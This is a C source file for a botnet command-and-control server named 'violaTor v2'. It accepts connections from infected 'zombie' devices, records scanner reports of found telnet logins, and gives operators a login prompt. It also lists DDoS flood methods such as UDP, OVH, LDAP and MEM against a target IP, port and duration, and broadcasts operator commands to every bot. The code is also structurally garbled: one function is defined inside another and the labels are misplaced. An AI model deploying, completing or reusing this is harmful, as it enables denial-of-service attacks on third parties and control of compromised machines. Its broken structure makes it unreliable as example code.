// libraries
#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>

#define MAXFDS 1000000

// xlient data structure
struct clientdata_t {
    uint32_t ip;       // xlient IP address
    char connected;    // connection status
} clients[MAXFDS];

// arguments structure for threading
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

// telnet data structure
struct telnetdata_t {
    int connected;     // connection status
} managements[MAXFDS];

// user login data structure
struct violaTor_login {
    char username[100];
    char password[100];
};
static struct violaTor_login accounts[100];

// global file and socket descriptors
static volatile FILE *telFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
static volatile int OperatorsConnected = 0;

// read from file descriptor into a buffer
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
    int total = 0, got = 1;
    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

// trim whitespace from a string
void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

// make a socket non-blocking
static int make_socket_non_blocking(int sfd) {
    int flags, s;
    flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl(sfd, F_SETFL, flags);
    if (s == -1) {
        perror("fcntl");
        return -1;
    }
    return 0;
}

// create and bind a socket to a port
static int create_and_bind(char *port) {
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;       // IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM;   // TCP
    hints.ai_flags = AI_PASSIVE;       // all interfaces
    s = getaddrinfo(NULL, port, &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
            perror("setsockopt");
        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0) {
            break;
        }
        close(sfd);
    }
    if (rp == NULL) {
        fprintf(stderr, "unable to bind\n");
        return -1;
    }
    freeaddrinfo(result);
    return sfd;
}
// handling bot events
void *BotEventLoop(void *useless) {
    struct epoll_event event; // declare an epoll_event structure for event handling
    struct epoll_event *events; // declare a pointer for multiple events
    int s; // variable for error checking
    events = calloc(MAXFDS, sizeof event); // allocate memory for events based on max file descriptor size

    // infinite loop for event processing
    while (1) {
        int n, i; // variables for number of events and iterator
        n = epoll_wait(epollFD, events, MAXFDS, -1); // wait for events on epoll file descriptor

        // iterate through the number of events
        for (i = 0; i < n; i++) {
            // check if there are any errors or hangups and no data to read
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0; // mark client as not connected
                close(events[i].data.fd); // close the file descriptor
                continue; // move to the next event
            }
            // check if the event is on the listening file descriptor
            else if (listenFD == events[i].data.fd) {
                while (1) {
                    struct sockaddr in_addr; // sockaddr structure for client address
                    socklen_t in_len; // variable for address length
                    int infd, ipIndex; // variables for incoming file descriptor and index

                    in_len = sizeof in_addr; // set the size of in_addr
                    infd = accept(listenFD, &in_addr, &in_len); // accept new connections

                    // check for errors in accept call
                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) // check if the error is due to non-blocking I/O
                            break; // no more incoming connections, break the loop
                        else {
                            perror("accept"); // print accept error message
                            break; // break the loop
                        }
                    }

                    // store the client IP address
                    clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

                    // check for duplicate connections
                    int dup = 0; // flag for duplicate
                    for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
                        if (!clients[ipIndex].connected || ipIndex == infd) continue; // skip if not connected or same file descriptor
                        if (clients[ipIndex].ip == clients[infd].ip) { // check if IP address is the same
                            dup = 1; // set duplicate flag
                            break; // break the loop
                        }
                    }

                    // if duplicate connection found
                    if (dup) {
                        if (send(infd, "[!] KILLBIE\n", 13, MSG_NOSIGNAL) == -1) { // try to send botkill message
                            close(infd); // close the file descriptor if send fails
                            continue; // continue to the next event
                        }
                        close(infd); // close the file descriptor
                        continue; // continue to the next event
                    }

                    // make the socket non-blocking
                    s = make_socket_non_blocking(infd);
                    if (s == -1) { // check for errors
                        close(infd); // close the file descriptor on error
                        break; // break the loop
                    }

                    // set up the event structure for the new socket
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET; // set events to input and edge-triggered
                    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event); // add the new socket to epoll
                    if (s == -1) { // check for errors
                        perror("epoll_ctl"); // print epoll_ctl error message
                        close(infd); // close the file descriptor
                        break; // break the loop
                    }
                    clients[infd].connected = 1; // mark the client as connected
                }
                continue; // continue to the next event
            } else {
                // handle data from a client
                int datafd = events[i].data.fd; // get the file descriptor from the event
                struct clientdata_t *client = &(clients[datafd]); // get the client data
                int done = 0; // flag for completion
                client->connected = 1; // mark the client as connected

                // loop for handling client data
                while (1) {
                    ssize_t count; // variable for data count
                    char buf[2048]; // buffer for client data
                    memset(buf, 0, sizeof buf); // clear the buffer

                    // loop for reading client data
                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
                        if (strstr(buf, "\n") == NULL) { // check if newline is present
                            done = 1; // set completion flag
                            break; // break the loop
                        }
                        trim(buf); // trim the buffer

                        // respond to ping with pong
                        if (strcmp(buf, "PING") == 0) {
                            if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { // send pong response
                                done = 1; // set completion flag
                                break; // break the loop
                            }
                            continue; // continue to the next iteration
                        }

                        // handle report command
                        if (strstr(buf, "REPORT ") == buf) {
                            char *line = strstr(buf, "REPORT ") + 7; // get the report message
                            fprintf(telFD, "%s\n", line); // write the message to the file
                            fflush(telFD); // flush the file buffer
                            TELFound++; // increment telnet found counter
                            continue; // continue to the next iteration
                        }

                        // handle probing command
                        if (strstr(buf, "PROBING") == buf) {
                            char *line = strstr(buf, "PROBING"); // get the probing message
                            scannerreport = 1; // set scanner report flag
                            continue; // continue to the next iteration
                        }

                        // handle removing probe command
                        if (strstr(buf, "REMOVING PROBE") == buf) {
                            char *line = strstr(buf, "REMOVING PROBE"); // get the removing probe message
                            scannerreport = 0; // clear scanner report flag
                            continue; // continue to the next iteration
                        }

                        // ignore pong responses
                        if (strcmp(buf, "PONG") == 0) {
                            continue; // continue to the next iteration
                        }

                        // print the buffer to stdout
                        printf("buf: \"%s\"\n", buf);
                    }

                    // check if read operation is complete
                    if (count == -1) {
                        if (errno != EAGAIN) { // check if the error is not due to non-blocking I/O
                            done = 1; // set completion flag
                        }
                        break; // break the loop
                    } else if (count == 0) {
                        done = 1; // set completion flag
                        break; // break the loop
                    }

                    // if done, close the client connection
                    if (done) {
                        client->connected = 0; // mark client as not connected
                        close(datafd); // close the file descriptor
                    }
                }
            }
        }
    }
}
// broadcast a message to all connected clients except the sender
void broadcast(char *msg, int us, char *sender) {
    int sendMGM = 1; // flag to send message
    if(strcmp(msg, "PING") == 0) sendMGM = 0; // do not broadcast for ping messages
    char *wot = malloc(strlen(msg) + 10); // allocate memory for the message
    memset(wot, 0, strlen(msg) + 10); // clear the memory
    strcpy(wot, msg); // copy the message to wot
    trim(wot); // trim the message
    time_t rawtime; 
    struct tm *timeinfo;
    time(&rawtime); // get current time
    timeinfo = localtime(&rawtime); // convert to local time
    char *timestamp = asctime(timeinfo); // convert to string
    trim(timestamp); // trim the timestamp
    int i;
    for(i = 0; i < MAXFDS; i++) { // iterate through all possible file descriptors
        if(i == us || (!clients[i].connected)) continue; // skip sender and disconnected clients
        if(sendMGM && managements[i].connected) { // check if we need to send the message
            send(i, "\e[1;95m", 9, MSG_NOSIGNAL); // send the color code
            send(i, sender, strlen(sender), MSG_NOSIGNAL); // send the sender's name
            send(i, ": ", 2, MSG_NOSIGNAL); // send a colon and space
        }
        send(i, msg, strlen(msg), MSG_NOSIGNAL); // send the actual message
        send(i, "\n", 1, MSG_NOSIGNAL); // send a newline character
    }
    free(wot); // free the allocated memory
}

// count the number of connected bots
unsigned int BotsConnected() {
    int i = 0, total = 0; // initialize counters
    for(i = 0; i < MAXFDS; i++) { // iterate through all possible file descriptors
        if(!clients[i].connected) continue; // skip if not connected
        total++; // increment the total for each connected bot
    }
    return total; // return the total number of connected bots
}

// find a login in a file and return the line number
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line = 0;
    char temp[512]; // buffer for line

    if((fp = fopen("login.txt", "r")) == NULL) { // open the file
        return(-1); // return -1 if file cannot be opened
    }
    while(fgets(temp, 512, fp) != NULL) { // read lines from the file
        if((strstr(temp, str)) != NULL) { // check if the line contains the string
            find_result++; // increment result count
            find_line = line_num; // store the line number
        }
        line_num++; // increment line number
    }
    if(fp)
        fclose(fp); // close the file
    if(find_result == 0) return 0; // return 0 if not found
    return find_line; // return the line number where found
}
// function to handle each connected bot
void *BotWorker(void *sock) {
    int datafd = (int)sock; // cast sock to an integer to use as a data file descriptor
    int find_line;
    OperatorsConnected++; // increment the count of connected operators
    pthread_t title; // thread for managing titles
    char buf[2048]; // buffer for storing incoming data
    memset(buf, 0, sizeof buf); // clear the buffer
    char sentattacks[2048]; // buffer for sent attack messages
    memset(sentattacks, 0, 2048); // clear the sentattacks buffer
    char devicecount [2048]; // buffer for device count messages
    memset(devicecount, 0, 2048); // clear the devicecount buffer

    FILE *fp; // file pointer
    int i = 0;
    int c;
    fp = fopen("login.txt", "r"); // open login.txt file for reading
    while(!feof(fp)) { // read characters from the file
        c = fgetc(fp);
        ++i;
    }
    int j = 0;
    rewind(fp); // rewind the file pointer to the beginning of the file
    while(j != i - 1) { // read username and password pairs from the file
        fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
        ++j;
    }

    char clearscreen [2048]; // buffer for clear screen command
    memset(clearscreen, 0, 2048);
    sprintf(clearscreen, "\033[1A"); // write clear screen command to the buffer
    char user [10000]; // buffer for the username prompt

    sprintf(user, "\e[38;5;20musername\e[0m: \e[0m"); // format the username prompt

    if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end; // send the username prompt to the datafd
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end; // read the username from datafd into buf
    trim(buf); // trim the buffer
    char* nickstring;
    sprintf(accounts[find_line].username, buf); // copy the username from buf to accounts array
    nickstring = ("%s", buf); // set nickstring to buf
    find_line = Find_Login(nickstring); // find the line in login.txt corresponding to nickstring
    if(strcmp(nickstring, accounts[find_line].username) == 0){ // check if the nickstring matches the username in accounts array
        char password [10000]; // buffer for the password prompt
        sprintf(password, "\e[38;5;21mpassword\e[0m: \e[30m", accounts[find_line].username); // format the password prompt
        if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end; // send the password prompt to the datafd

        if(fdgets(buf, sizeof buf, datafd) < 1) goto end; // read the password from datafd into buf

        trim(buf); // trim the buffer
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed; // check if the password matches
        memset(buf, 0, 2048); // clear the buffer
        
        goto Banner; // go to the Banner label
    }
// function to update the terminal title for a connected client
void *TitleWriter(void *sock) {
    int datafd = (int)sock; // cast socket to integer data file descriptor
    char string[2048]; // buffer for the terminal title string

    // continuously update terminal title
    while(1) {
        memset(string, 0, 2048); // clear the string buffer
        // format the title string with the number of connected bots
        sprintf(string, "%c]0;violaTor v2 | zombies: %d %c", '\033', BotsConnected(), '\007');
        // send the title string to the client
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return; // exit if send fails
        sleep(2); // wait for 2 seconds before updating again
    }
}
                // labels for handling failed login and displaying banner
        failed:
            // this label is a placeholder for handling failed login attempts

        Banner:
            // create a thread to continuously update the terminal title
            pthread_create(&title, NULL, &TitleWriter, datafd);

            // banner strings initialization
            char banner0[10000];
            char banner1[10000];
            char banner2[10000];
            char banner3[10000];
            char banner4[10000];
            char banner5[10000];
            char banner6[10000];
            char banner7[10000];

            // format banner strings with welcome messages and bot counts
            sprintf(banner4, "\e[38;5;135mhi\e[0m\r\n");
            sprintf(banner5, "\e[38;5;135mhi!\e[0m\r\n");
            sprintf(banner6,  "\e[38;5;135m---------------zombies: %d----------\e[0m\r\n", BotsConnected());
            sprintf(banner7,  "\e[38;5;135muser: %s\e[0m\r\n", accounts[find_line].username);
            if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) return;
            if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) return;
            sleep(1);
            if(send(datafd, banner6, strlen(banner6), MSG_NOSIGNAL) == -1) return;
            sleep(1);
            if(send(datafd, banner7, strlen(banner7), MSG_NOSIGNAL) == -1) return;
            
            while(1) {
            char input [10000];
            sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
            sleep(1);
            if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            break;
            }
            pthread_create(&title, NULL, &TitleWriter, sock);
            managements[datafd].connected = 1;

            while(fdgets(buf, sizeof buf, datafd) > 0) {
            // handle different commands
            if (strstr(buf, "help")) {
            // if command is 'help', display help menu
            pthread_create(&title, NULL, &TitleWriter, sock); // create title writer thread
            char help1[800], help2[800], help3[800], help4[800], help6[800], help7[800], help8[800];
            
            // setting up help menu text
            sprintf(help1, "\e[1;95m╔═══════════════════════════════════════╗\e[0m\r\n");
            sprintf(help2, "\e[1;95m║\e[0m \e[0;96mATTACK\e[0m - attack commands       \e[1;95m║\e[0m\r\n");
            sprintf(help3, "\e[1;95m║\e[0m \e[0;96mSTATS\e[0m - server stats           \e[1;95m║\e[0m\r\n");
            sprintf(help6, "\e[1;95m║\e[0m \e[0;96mCLEAR\e[0m - clear + head back to banner \e[1;95m║\e[0m\r\n");
            sprintf(help7, "\e[1;95m║\e[0m \e[0;96mEXIT\e[0m - exit server           \e[1;95m║\e[0m\r\n");
            sprintf(help8, "\e[1;95m╚═══════════════════════════════════════╝\e[0m\r\n");



            // sending the help menu text
            if(send(datafd, help1, strlen(help1), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help2, strlen(help2), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help3, strlen(help3), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help6, strlen(help6), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help7, strlen(help7), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, help8, strlen(help8), MSG_NOSIGNAL) == -1) goto end;

            // prompt for next input
            char input[10000];
            sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
            if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            continue;
        }
        if(strstr(buf, "attack") || strstr(buf, "ATTACK") || strstr(buf, "METHODS") || strstr(buf, "methods")) {
                pthread_create(&title, NULL, &TitleWriter, sock);
                char attack1  [800];
                char attack2  [800];
                char attack3  [800];
                char attack4  [800];
                char attack5  [800];
                char attack6  [800];
                char attack7  [800];
                char attack8  [800];
                char attack9  [800];
                char attack10  [800];
                char attack11  [800];
                char attack12  [800];
                char attack13  [800];
                char attack14  [800];
                char attack15  [800];
                char attack16  [800];
                char attack17  [800];
                char attack18  [800];
                char attack19  [800];

                sprintf(attack1,  "\e[38;5;53mMETHODS MADE BY URMOMMY, ENJOY MOTHERFUCKER\e[0m\r\n");
                sprintf(attack2,  "\e[38;5;53mHOME METHODS\e[0m\r\n");
                sprintf(attack3,  "\e[38;5;20m! UDP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack4,  "\e[38;5;20m! STD \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack5,  "\e[38;5;20m! ECHO \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack6,  "\e[38;5;53mBYPASS METHODS \e[0m\r\n");
                sprintf(attack7,  "\e[38;5;20m! ZGO \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack8,  "\e[38;5;20m! ZDP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack9,  "\e[38;5;20m! GAME \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack10,  "\e[38;5;20m! NFO \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack11,  "\e[38;5;20m! OVH \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack12,  "\e[38;5;20m! VPN \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack13,  "\e[38;5;53mPROTOCOL METHODS \e[0m\r\n");
                sprintf(attack14,  "\e[38;5;20m! XTD \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack15,  "\e[38;5;20m! LDAP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack16,  "\e[38;5;20m! SDP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack17,  "\e[38;5;20m! MEM \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack18,  "\e[38;5;20m! RIP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                sprintf(attack19,  "\e[38;5;20m! VSE \e[0m[IP] [PORT] [TIME] \e[0m\r\n");


                    
                if(send(datafd, attack1,  strlen(attack1),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack2,  strlen(attack2),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack3,  strlen(attack3),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack4,  strlen(attack4),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack5,  strlen(attack5),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack6,  strlen(attack6),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack7,  strlen(attack7),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack8,  strlen(attack8),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack9,  strlen(attack9),  MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack10,  strlen(attack10),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack11,  strlen(attack11),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack12,  strlen(attack12),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack13,  strlen(attack13),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack14,  strlen(attack14),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack15,  strlen(attack15),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack16,  strlen(attack16),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack17,  strlen(attack17),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack18,  strlen(attack18),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, attack19,  strlen(attack19),    MSG_NOSIGNAL) == -1) goto end;


                pthread_create(&title, NULL, &TitleWriter, sock);
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                continue;
        }

            if(strstr(buf, "STATS") || strstr(buf, "zombies") || strstr(buf, "stats")) {
                char devicecount [2048];
                memset(devicecount, 0, 2048);
                char onlineusers [2048];
                char userconnected [2048];
                sprintf(devicecount, "\e[0mzombies connected: %d\e[0m\r\n", BotsConnected());       
                sprintf(onlineusers, "\e[0musers online: %d\e[0m\r\n", OperatorsConnected);
                sprintf(userconnected, "\e[0muser: %s\e[0m\r\n", accounts[find_line].username);
                if(send(datafd, devicecount, strlen(devicecount), MSG_NOSIGNAL) == -1) return;
                if(send(datafd, onlineusers, strlen(onlineusers), MSG_NOSIGNAL) == -1) return;
                if(send(datafd, userconnected, strlen(userconnected), MSG_NOSIGNAL) == -1) return;
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                continue;
            }

            if(strstr(buf, "clear")) {
                char clearscreen [2048];
                memset(clearscreen, 0, 2048);
  sprintf(clearscreen, "\033[2J\033[1;1H");
  if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner0, strlen(banner0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, banner6, strlen(banner6), MSG_NOSIGNAL) == -1) goto end;

                while(1) {
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }
            if(strstr(buf, "exit")) {
                char exitmessage [2048];
                memset(exitmessage, 0, 2048);
                sprintf(exitmessage, "\e[0mexiting server in 3s...\e[0m", accounts[find_line].username);
                if(send(datafd, exitmessage, strlen(exitmessage), MSG_NOSIGNAL) == -1)goto end;
                sleep(3);
                goto end;
            }

        if(strstr(buf, "! UDP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! STD")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! ECHO")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! ZGO"))
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! ZDP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! GAME")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! NFO")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! OVH")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! VPN")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! XTD")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! LDAP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! SDP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! RIP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! MEM")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! VSE")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! STOP")) 
        {
        sprintf(sentattacks, "\e[0mattack sent!\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
            trim(buf);
        char input [10000];
        sprintf(input, "\e[0m[\e[38;5;53mviolaTor\e[0m]~: \e[0m");
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;

        // if the buffer is empty, continue to the next iteration
        if(strlen(buf) == 0) continue;

        // log the user command
        printf("\e[1;95muser: %s | command: %s\e[0m\n", accounts[find_line].username, buf);

        FILE *logfile = fopen("Logs.log", "a");
        fprintf(logfile, "user: %s | command: %s\n", accounts[find_line].username, buf);
        fclose(logfile);

        // broadcast the command
        broadcast(buf, datafd, accounts[find_line].username);

        // clear the buffer for the next command
        memset(buf, 0, 2048);
    }

    // handle disconnection
    end:
    managements[datafd].connected = 0; // mark management as disconnected
    close(datafd); // close the data socket
    OperatorsConnected--; // decrement the number of connected operators
}
// function to listen for incoming bot connections
void *BotListener(int port) {
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0); // create a socket
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr)); // clear the server address structure
    serv_addr.sin_family = AF_INET; // set the address family to IPv4
    serv_addr.sin_addr.s_addr = INADDR_ANY; // listen on any interface
    serv_addr.sin_port = htons(port); // set the port to listen on
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding"); // bind the socket
    listen(sockfd,5); // listen for incoming connections
    clilen = sizeof(cli_addr); // set the size of the client address
    while(1) { // main loop to accept incoming connections
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); // accept a new connection
        if (newsockfd < 0) perror("ERROR on accept"); // error handling
        pthread_t thread; // create a thread for each connection
        pthread_create(&thread, NULL, &BotWorker, (void *)newsockfd); // start the BotWorker thread
    }
}
int main (int argc, char *argv[], void *sock) {
    // welcome message
    printf("\e[0;96mwelcome to violaTor\e[0m\n");

    // ignore broken pipe signals to avoid crashes
    signal(SIGPIPE, SIG_IGN);

    // define variables for server setup
    int s, threads, port;
    struct epoll_event event;

    // check for correct number of command line arguments
    if (argc != 4) {
        fprintf(stderr, "\e[1;95m[!]incorrect[!]\e[0m\n");
        exit(EXIT_FAILURE);
    }

    // convert command line arguments to port number and number of threads
    port = atoi(argv[3]);
    threads = atoi(argv[2]);

    // create and bind a socket to a port
    listenFD = create_and_bind(argv[1]);
    if (listenFD == -1) abort();

    // set the socket to non-blocking mode
    s = make_socket_non_blocking(listenFD);
    if (s == -1) abort();

    // start listening for connections on the socket
    s = listen(listenFD, SOMAXCONN);
    if (s == -1) {
        perror("listen");
        abort();
    }

    // create an epoll instance for managing multiple file descriptors
    epollFD = epoll_create1(0);
    if (epollFD == -1) {
        perror("epoll_create");
        abort();
    }

    // add the listening socket to the epoll instance
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1) {
        perror("epoll_ctl");
        abort();
    }

    // create threads for handling bot events
    pthread_t thread[threads + 2];
    while (threads--) {
        pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void *)NULL);
    }

    // create a thread for listening for new connections
    pthread_create(&thread[0], NULL, &BotListener, port);

    // continuously broadcast a ping message every 60 seconds
    while (1) {
        broadcast("PING", -1, "violaTor");
        sleep(60);
    }

    // close the listening socket before exiting
    close(listenFD);
    return EXIT_SUCCESS;
}
